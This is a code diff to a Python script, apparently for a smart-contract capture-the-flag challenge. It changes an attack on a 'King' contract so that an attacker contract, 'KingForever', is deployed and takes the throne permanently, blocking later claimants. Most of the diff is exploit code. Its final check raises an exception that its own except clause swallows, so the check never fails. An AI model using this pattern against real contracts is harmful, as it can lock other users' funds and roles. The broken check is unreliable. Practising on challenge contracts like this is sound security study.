@@ -15,15 +15,21 @@ def attack():
 
     console.print(f"[green]Owner Before The Hack: [magenta]{target_contract._king()}")
     console.print("[red]Attacking Now...")
+    
     prize_value = target_contract.prize()
-    attacker.transfer(
-        value=prize_value + convert("0.000001 eth", int),
-        to=target_contract,
-        account=attacker,
-    )
+    attacking_contract = project.KingForever.deploy(value=prize_value, sender=attacker)
 
-    assert target_contract._king() == attacker.address
+    attacking_contract.overthrowKing(target_contract.address, sender=attacker)
+
+    # assert target_contract._king() == attacker.address
     console.print(f"[green]King After The Hack: [magenta]{target_contract._king()}")
+
+    prize_value = target_contract.prize()
+    try:
+        attacker.transfer(to=ADDRESS, value=prize_value, account=attacker)
+        raise Exception("Still able to overthow the king!!")
+    except Exception as e:
+        pass
 
 
 def main():
